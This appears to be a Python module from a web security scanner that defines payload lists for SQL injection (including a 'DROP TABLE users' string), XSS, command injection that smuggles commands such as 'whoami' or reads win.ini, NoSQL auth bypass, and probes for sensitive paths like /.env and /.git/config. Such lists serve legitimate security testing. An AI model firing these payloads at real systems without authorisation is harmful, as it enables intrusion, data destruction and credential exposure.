"""Shared attack payload dictionaries."""

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin' --",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR SLEEP(5)--",
    "admin'--",
    "'; DROP TABLE users--",
    "' UNION SELECT 1,2,3--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "jaVasCript:/*-/*`/*--></script><img src=x>",
    "</script><script>alert(1)</script>",
    "<body onload=alert(1)>",
]

CMD_INJECT_PAYLOADS = [
    "; ls",
    "| whoami",
    "; whoami",
    "| dir",
    "& ping -n 1 127.0.0.1 &",
    "& dir",
    "| type C:\\Windows\\win.ini",
    "; id",
    "`ls`",
]

COMMON_PATHS = [
    "/admin",
    "/WEB-INF/web.xml",
    "/backup",
    "/config",
    "/.env",
    "/console",
    "/actuator",
    "/swagger-ui.html",
    "/actuator/health",
    "/actuator/info",
    "/.git/config",
    "/jenkins",
    "/api/swagger.json",
    "/api/v1/",
    "/graphql",
]

NOSQLI_PAYLOADS = {
    "auth_bypass": [
        {"$ne": ""},
        {"$ne": "x"},          # non-empty $ne — some parsers reject empty values
        {"$gt": ""},
        {"$gt": "x"},          # non-empty $gt variant
        {"$regex": ".*"},
        {"$regex": "^.*$"},    # anchored regex alternative
        {"$exists": True},     # matches any field that exists
        {"$in": ["admin"]},
        {"$nin": [""]},        # not-in with empty (matches everything non-empty)
        {"$or": []},
        {"$or": [{}]},         # empty condition — always true
        {"username": "admin", "password": {"$ne": ""}},
    ],
    "field_injection": [
        {"field": {"$gt": ""}},
        {"$exists": True},
    ],
}
